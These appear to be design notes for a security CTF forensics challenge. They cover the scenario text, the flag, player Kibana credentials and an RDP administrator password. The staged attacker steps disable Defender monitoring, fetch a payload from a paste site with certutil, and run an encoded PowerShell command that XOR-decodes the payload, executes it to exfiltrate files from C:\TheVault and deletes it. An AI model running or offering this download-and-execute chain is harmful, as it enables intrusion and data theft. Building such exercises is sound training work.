rdp:
Administrator
Qb!P7TqTb@s;7Ag6CIe3pTSo3YxrBi9m


ctf kibana:
ctf_user
darkmode4lyfe

compressed b64
obfuscated invoke-webrequest

script that does some basic system enum

then attackers pulls down another script, which has a payload that is xor encrypted with some info from the enum script
    it needs to be either bruteforcible or something player can glean from kibana
    script on pastebin?

that script exfils data over smb to c2 server

=========================

attacker actions:
    (somehow get access to the box)
    run some basic enum commands (ls, whoami, net user, etc.)

    run a script that does more thorough enumeration
        this script should be able to be found by the players
        this script exfils data to a server

    pulls down a script from the internet
        payload is xor encrypted with some of that data
        mac addr? available in kibana
        script hosted on pastebin or something

        script exfils files to a server
        generates a key for each file
        rest api to upload files to the server

        player finds the web server, and has to reverse the powershell script to understand how the key gets generated
        then they can generate a key for the flag file, and get it from the server

web app, they have to basic auth to get in, creds should be in the powershell script
once they get in, they should be able to view a file listing, and a text field for "enter secret file access key"
that access key is something they can build from reversing the powershell script
other files should just be dank memes

edit: python pickle the file before it gets uploaded to the server
players exploit the server by uploading a malicious pickle
they get it executed by navigating through the secret file access key mechanism
all files require an access key, generated by the exfil script and included in the post request to upload the file
    hardcode in the web app source code that some paths are allowed to be shown on the listing
    then have a text field to enter an access key or whatever

final version: back to just getting the file, no pickle

=======================

description:

IcyRetina has called you back up to the big leagues to respond to a breach at one of their most important customers, which occurred sometime after 17:00 PDT today. Luckily, this customer had sophisticated logging setup for the host that was compromised, including Sysmon and extended PowerShell logging. Apparently, the attacker was able to exfil some very sensitive data. Can you help them recover the stolen data?

View the logs here:
https://ctfleague-elk.osusec.org:5601/
Username: `ctf_user`
Password: `darkmode4lyfe`

flag:

osu{why_wr1t3_pyth0n_wh3n_y0u_c4n_wr1te_P0W3RSH3L1!?}

---------------

manual commands to run:
    in admin powershell

# DISABLE REAL TIME MONITORING

pwd
dir
whoami
net user
net accounts
net share
ipconfig
getmac
set-executionpolicy unrestricted

certutil.exe -urlcache -split -f https://ghostbin.co/paste/nrn9/raw "${env:TEMP}\a"

powershell -encoded JABjAG8AbgB0AGUAbgB0AHMAIAA9ACAARwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBwAGEAdABoACAAIgAkAHsAZQBuAHYAOgBUAEUATQBQAH0AXABhACIAOwAkAGIAeQB0AGUAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABjAG8AbgB0AGUAbgB0AHMAKQA7ACQAbgBpAGMAcwAgAD0AIABnAGUAdAAtAG4AZQB0AGEAZABhAHAAdABlAHIAOwAkAG0AYQBjACAAPQAgACQAbgBpAGMAcwBbADAAXQAuAE0AYQBjAEEAZABkAHIAZQBzAHMALgBSAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAIgApADsAJABrAGUAeQAgAD0AIABbAGIAeQB0AGUAWwBdAF0AIAAtAHMAcABsAGkAdAAgACgAJABtAGEAYwAgAC0AcgBlAHAAbABhAGMAZQAgACIALgAuACIALAAgACIAMAB4ACQAJgAgACIAKQA7ACQAawBlAHkAIAA9ACAAQAAoADAAeAAwAGUALAAgADAAeAAyAGIALAAgADAAeABkADQALAAgADAAeABkADYALAAgADAAeAAyAGQALAAgADAAeAA2ADkAKQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwArACkAewAkAGIAeQB0AGUAcwBbACQAaQBdACAAPQAgACQAYgB5AHQAZQBzAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdAH0AOwAkAG8AdQB0ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACkAKQA7AFMAZQB0AC0AQwBvAG4AdABlAG4AdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAQgB5AHQAZQAgAC0AUABhAHQAaAAgACIAJAB7AGUAbgB2ADoAVABFAE0AUAB9AFwAYgAuAHAAcwAxACIAIAAtAFYAYQBsAHUAZQAgACQAbwB1AHQAOwAmACAAIgAkAHsAZQBuAHYAOgBUAEUATQBQAH0AXABiAC4AcABzADEAIgAgAC0AcABhAHQAaAAgACIAQwA6AFwAVABoAGUAVgBhAHUAbAB0ACIAOwBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiACQAewBlAG4AdgA6AFQARQBNAFAAfQBcAGIALgBwAHMAMQAiAA==

----------------

encrypted exfil b64
    https://ghostbin.co/paste/nrn9/raw